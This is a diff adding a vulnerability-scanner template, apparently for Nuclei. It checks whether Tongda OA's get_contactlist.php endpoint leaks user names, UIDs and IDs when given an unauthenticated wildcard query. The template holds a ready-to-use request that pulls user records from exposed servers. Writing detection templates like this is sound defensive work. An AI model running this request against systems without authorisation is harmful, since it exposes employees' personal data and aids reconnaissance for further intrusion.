@@ -1,0 +1,26 @@
+id: tongda-oa-get-contactlist-info-leak
+info:
+  name: "通达OA get_contactlist.php 敏感信息泄露"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 通达OA
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3f"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"user_name\":"
+          - "\"user_uid\":"
+          - "\"user_id\":"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
